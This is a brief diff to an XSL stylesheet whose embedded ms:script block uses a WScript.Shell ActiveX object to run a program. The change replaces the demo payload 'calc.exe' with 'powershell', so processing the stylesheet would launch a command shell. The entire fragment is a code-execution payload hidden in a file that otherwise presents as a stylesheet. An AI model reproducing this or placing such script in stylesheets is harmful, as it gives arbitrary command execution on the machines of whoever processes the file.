@@ -8,6 +8,6 @@ version="1.0">
 	<![CDATA[
 	var r = new ActiveXObject("WScript.Shell");
 	var taslim = "nako amoo";
-	r.Run("calc.exe");
+	r.Run("powershell");
 	]]> </ms:script>
 </stylesheet>
